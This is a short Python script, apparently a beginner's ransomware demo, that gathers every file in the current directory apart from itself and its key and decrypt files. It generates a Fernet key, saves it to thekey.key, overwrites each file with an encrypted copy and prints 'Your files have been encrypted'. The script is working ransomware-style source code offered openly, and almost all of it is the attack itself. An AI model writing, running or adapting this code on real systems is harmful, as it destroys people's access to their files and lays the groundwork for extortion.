#finding files

import os
from cryptography.fernet import Fernet
#fernet is an encryption method that makes sure the message can not be read without a key ;p

#finding files

files = []
for file in os.listdir():
    if file == "encrypt.py" or file == "thekey.key" or file == "decrypt.py":
        continue
    if os.path.isfile(file):
        files.append(file)

print(files)

key = Fernet.generate_key()

print(key)
with open("thekey.key","wb") as thekey:
    thekey.write(key)

for file in files:
    with open(file, "rb") as thefile:
        contents = thefile.read()
        contents_encrypted = Fernet(key).encrypt(contents)
    with open(file, "wb") as thefile:
        thefile.write(contents_encrypted)
    print("Your files have been encrypted")

